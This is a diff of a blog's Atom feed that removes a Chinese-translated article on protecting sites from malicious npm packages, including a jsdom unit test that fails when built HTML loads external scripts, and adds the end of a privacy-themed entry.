-  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scriptElementWithSource&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'script[src]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;expect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scriptElementWithSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toBe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;我允許&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;標籤沒有源碼（所以要inline code
-），但阻擋具有&lt;code class=&quot;highlighter-rouge&quot;&gt;src&lt;/code&gt;屬性的腳本標籤。我設置&lt;code class=&quot;highlighter-rouge&quot;&gt;jsdom&lt;/code&gt;執行腳本，所以我可以捕捉到如果有人正在使用&lt;code class=&quot;highlighter-rouge&quot;&gt;document.createElement()&lt;/code&gt;創建一個新的腳本元素。&lt;/p&gt;
-
-&lt;p&gt;至少在這種情況下，新的孩子實際上確實需要修改一個單元測試來添加一個腳本時，如果有那麼點運氣就可以啟動程式碼審查人員，這就足以檢視這個修改。&lt;/p&gt;
-
-&lt;p&gt;在已發布的安全HTML文件上運行這種性質的檢查也是一個好主意。然後，您可以更加輕鬆地使用Firebase工具和Webpack之類的東西，並且知道這1200個軟體包中的任何一個編輯您輸出的情況極其罕見。&lt;/p&gt;
-
-&lt;h3 id=&quot;包起來&quot;&gt;包起來&lt;/h3&gt;
-
-&lt;p&gt;在我走之前，我想談談在過去幾周裡我聽到很多的感受 - 我建議開發者應該使用更少的npm。&lt;/p&gt;
-
-&lt;p&gt;我理解這背後的情感驅動：這些包裹有可能是有壞包裹的，所以越少的包裹必定越少問題。&lt;/p&gt;
-
-&lt;p&gt;但這不是一個好的建議。如果你的用戶數據的安全性完全依賴於你使用&lt;strong&gt;更少的&lt;/strong&gt;npm包，你的東西就談不上安全。&lt;/p&gt;
-
-&lt;p&gt;這就像讓一部分的杜賓遠離開你的倉鼠而已。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;如果我明天要開始一個新項目，創建一個處理高度敏感信息的網站，我會像我一個月前那樣，使用我的React，Webpack，Babel其他快樂夥伴。&lt;/p&gt;
-
-&lt;p&gt;我不在乎是否有一千個軟體包或者他們會不斷地改變成更多或者我永遠不知道其中一個是否含有惡意程式碼。&lt;/p&gt;
-
-&lt;p&gt;沒有一件事對我來會造成問題，因為我壓根不會把他們中的任何一個單獨留在教室裡與我的倉鼠獨處。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;嘿，謝謝你的閱讀！一如既往，安全是一項團隊運動; 如果我說了一些愚蠢的話或給出不好的建議，請讓我知道，我會努力解決它的。如果你有一個好主意也請讓我知道，我會添加它進文章並假裝它是我的。&lt;/p&gt;
-
-&lt;p&gt;祝你有個美好的一天！&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Third-party code" /><summary type="html">我最近有寫了一篇文章，描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。</summary></entry></feed>
+&lt;hr /&gt;</content><author><name>jhe</name></author><category term="privacy" /><summary type="html">Taking privacy seriously leaving google behind</summary></entry></feed>
